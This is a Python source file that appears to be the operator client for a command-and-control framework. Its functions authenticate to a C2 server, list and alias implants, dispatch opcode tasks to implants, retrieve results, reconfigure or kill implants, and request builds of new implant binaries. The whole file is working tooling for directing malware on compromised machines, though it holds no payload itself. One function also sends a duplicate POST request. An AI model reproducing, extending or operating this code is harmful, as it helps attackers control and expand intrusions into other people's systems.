import sys
from typing import Any, Dict, List, Optional, Union
import requests
from dataclasses import dataclass
import structlog
from opcodes import Opcodes

from config import OperatorConfig

logger = structlog.get_logger()


@dataclass
class ServerAuthResponseSuccess:
    token: str
    rmq_host: str
    rmq_port: str
    rmq_queue: str
    status: bool


@dataclass
class ServerAuthResponseFailure:
    status: bool
    message: str


ServerAuthResponse = Union[ServerAuthResponseSuccess, ServerAuthResponseFailure]


def check_auth_token(config: OperatorConfig) -> bool:
    """
    Check if the auth token is valid
    """
    return (
        send_authenticated_request("GET", "/op/auth/token/status", config)
        .json()
        .get("status")
    )


def server_auth(ip: str, port: int, name: str, login_secret: str) -> ServerAuthResponse:
    """
    Authenticate with the server and get a token and RabbitMQ credentials.
    """
    url = f"http://{ip}:{port}/op/auth/token/request"
    headers = {
        "X-ID": name,
        "X-Signature": login_secret,
    }

    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        return ServerAuthResponseSuccess(
            token=response.json()["token"],
            rmq_host=response.json()["rmq_host"],
            rmq_port=response.json()["rmq_port"],
            rmq_queue=response.json()["rmq_queue"],
            status=True,
        )
    else:
        return ServerAuthResponseFailure(status=False, message=response.json()["msg"])


def handle_server_auth(config: OperatorConfig) -> str:
    """
    Authenticate to the server and return the auth token
    """
    # Attempt to authenticate to the server
    try:
        auth_result = server_auth(
            config.c2, config.c2_port, config.name, config.enc_and_sign_secret()
        )
    except requests.exceptions.ConnectionError as ce:
        logger.error("Failed to connect to server", exc_info=ce)
        sys.exit(1)
    if auth_result is None:
        logger.error("Failed to authenticate to server", auth_result=None)
        sys.exit(1)

    if auth_result.status != True:
        assert type(auth_result) == ServerAuthResponseFailure
        logger.error("Failed to authenticate to server", message=auth_result.message)
        sys.exit(1)

    assert type(auth_result) == ServerAuthResponseSuccess
    return auth_result.token


def ensure_token(config: OperatorConfig) -> None:
    """
    Helper method to ensure the operator is authenticated before running a function.
    If it isn't authenticated, it will attempt to authenticate and update the given `config` object to include the auth token.
    """
    if config.auth_token is None or len(config.auth_token) == 0:
        config.auth_token = handle_server_auth(config)
    if not check_auth_token(config):
        config.auth_token = handle_server_auth(config)


def send_authenticated_request(
    method: str, endpoint: str, config: OperatorConfig, **request_kwargs
) -> requests.Response:
    """
    Build and send an authenticated response to the given endpoint. The C2 and authentication information
    will be extracted from `config`.
    """
    url = f"http://{config.c2}:{config.c2_port}{endpoint}"
    headers = {
        "Authorization": f"Bearer {config.auth_token}",
    }

    return requests.request(method=method, url=url, headers=headers, **request_kwargs)


def list_implants(config: OperatorConfig) -> List[Any]:
    """
    List all the implants
    """
    try:
        ensure_token(config)
        response = send_authenticated_request("GET", "/op/implant/list", config)
        return response.json()["implants"]
    except Exception as e:
        logger.error("Failed to list implants", exc_info=e)
        return []


def get_server_stats(config: OperatorConfig) -> Dict[str, Any]:
    try:
        ensure_token(config)
        response = send_authenticated_request("GET", "/op/stats", config)
        return response.json()
    except requests.exceptions.ConnectionError as ce:
        logger.error(
            "Server is down. Please check the server logs for more information.",
            exc_info=ce
        )
        sys.exit(1)
    except Exception as e:
        logger.error("Failed to get server stats", exc_info=e)
        return {}


def get_tasks(config: OperatorConfig) -> List[Dict[Any, Any]]:
    try:
        ensure_token(config)

        response = send_authenticated_request(
            "GET", "/op/tasks/list", config, timeout=120
        )
        if response.json()["status"] != True:
            logger.error("Failed to get tasks")
            return []
        return response.json()["tasks"]
    except Exception as e:
        logger.error("Failed to get tasks", exc_info=e)
        return []


def add_task(
    config: OperatorConfig, opcode: int, implant_id: str, args: Any
) -> Dict[str, Any]:
    try:
        ensure_token(config)

        data = {
            "opcode": opcode,
            "implant_id": implant_id,
            "args": args,
        }

        response = send_authenticated_request(
            "POST", "/op/tasks/add", config, json=data
        )
        if response.json()["status"] != True:
            logger.error("Failed to add task")
            return {}
        logger.info(f"Dispatched task", type=Opcodes.get_by_value(opcode), task_id=response.json()['task']['task_id'], implant_id=implant_id, opcode=opcode)
        return response.json()["task"]
    except Exception as e:
        logger.error("Failed to add task", exc_info=e)
        return {}


def get_task_result(config: OperatorConfig, task_id: str) -> Optional[str]:
    try:
        ensure_token(config)

        response = send_authenticated_request(
            "GET", f"/op/tasks/results/{task_id}", config
        )
        if response.json()["status"] != True:
            logger.error("Failed to get task result")
            return None
        return response.json()["result"]
    except Exception as e:
        logger.error("Failed to get task result", exc_info=e)
        return ""


def implant_exists(config: OperatorConfig, id_prefix: str) -> bool:
    implants = list_implants(config)
    for implant in implants:
        if implant["implant_id"].startswith(id_prefix):
            return True
    return False


def get_implant_profile(config: OperatorConfig, implant_id: str) -> Dict[str, Any]:
    ensure_token(config)

    response = send_authenticated_request(
        "GET", f"/op/implant/config/{implant_id}", config
    )
    if response.json()["status"] != True:
        logger.error("Failed to get implant config: %s", response.json()["msg"])
        return {}

    return response.json()["config"]


def update_implant_profile(
    config: OperatorConfig, implant_id: str, changes: Dict[str, Any]
) -> None:
    ensure_token(config)

    url = f"http://{config.c2}:{config.c2_port}/op/implant/config/{implant_id}"
    headers = {
        "Authorization": f"Bearer {config.auth_token}",
    }

    response = requests.post(url, headers=headers, json=changes)
    response = send_authenticated_request(
        "POST", f"/op/implant/config/{implant_id}", config, json=changes
    )
    if response.json()["status"] != True:
        logger.error("Failed to update implant config")
        return
    logger.debug("Updated implant config", implant_id=implant_id)


def kill_implant(config: OperatorConfig, implant_id: str) -> None:
    ensure_token(config)

    response = send_authenticated_request(
        "DELETE", f"/op/implant/kill/{implant_id}", config
    )
    if response.json()["status"] != True:
        logger.error("Failed to kill implant")
        return
    logger.info("Killed implant", implant_id=implant_id)


def build_implant(config: OperatorConfig, build_options: dict) -> str:
    """
    Requests the server to build an implant with the given `build_options` and return the base64 encoded
    representation of the final binary.
    """

    ensure_token(config)

    response = send_authenticated_request(
        "POST", "/op/implant/build", config, json=build_options
    )
    if response.status_code != 200:
        logger.error("Failed to build implant")
        logger.error(f"Server response: {response.text}")
        return ""
    return response.json()["implant"]


def set_implant_alias(config: OperatorConfig, implant_id: str, alias: str) -> None:
    """
    Set an alias for a given implant
    """
    ensure_token(config)

    response = send_authenticated_request(
        "POST", f"/op/implant/{implant_id}/alias/create", config, json={"alias": alias}
    )
    if response.json()["status"] != True:
        logger.error(f"Failed to set implant alias: {response.json()['msg']}")
        return
    logger.info("Set implant alias", implant_id=implant_id, alias=alias)


def list_implant_aliases(config: OperatorConfig, implant_id: str) -> List[str]:
    """
    List all aliases for a given implant
    """
    ensure_token(config)

    response = send_authenticated_request(
        "GET", f"/op/implant/{implant_id}/alias/list", config
    )
    if response.json()["status"] != True:
        logger.error(f"Failed to list implant aliases: {response.json()['msg']}")
        return []
    return response.json()["aliases"]

def delete_implant_alias(config: OperatorConfig, implant_id: str, alias: str) -> None:
    """
    Delete an alias for a given implant
    """
    ensure_token(config)

    response = send_authenticated_request(
        "DELETE", f"/op/implant/{implant_id}/alias/delete/{alias}", config
    )
    if response.json()["status"] != True:
        logger.error(f"Failed to delete implant alias: {response.json()['msg']}")
        return
    logger.info("Deleted implant alias", implant_id=implant_id, alias=alias)

def resolve_implant_alias(config: OperatorConfig, alias: str) -> Optional[str]:
    """
    Resolve an implant alias to an implant id
    """
    ensure_token(config)

    response = send_authenticated_request(
        "GET", f"/op/implant/alias/resolve/{alias}", config
    )
    if response.json()["status"] != True:
        logger.error(f"Failed to resolve implant alias: {response.json()['msg']}")
        return None
    return response.json()["implant_id"]